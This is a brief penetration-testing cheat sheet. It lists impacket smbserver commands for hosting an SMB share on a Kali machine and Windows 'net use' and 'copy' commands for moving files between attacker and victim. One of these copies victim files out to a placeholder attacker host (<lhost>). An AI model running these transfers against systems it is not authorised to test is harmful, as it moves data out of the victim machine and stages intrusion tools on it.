# linux attacker

## smb host

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

## smb2 with password

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username username -password password kali .
```

# windows attacker

## mount smb share to letter

```cmd
net use u: \\<lhost>\kali /user:username password
```

## unmount smb share

```cmd
net use u: /d
```

## move files from attacker to victim via smb share

```cmd
copy \\<lhost>\kali\<some-file> C:\PrivEsc\<some-file>
```

## move files from victiom to attacker via smb share

```cmd
copy C:\PrivEsc\<some-file> \\<lhost>\kali\<some-file>
```
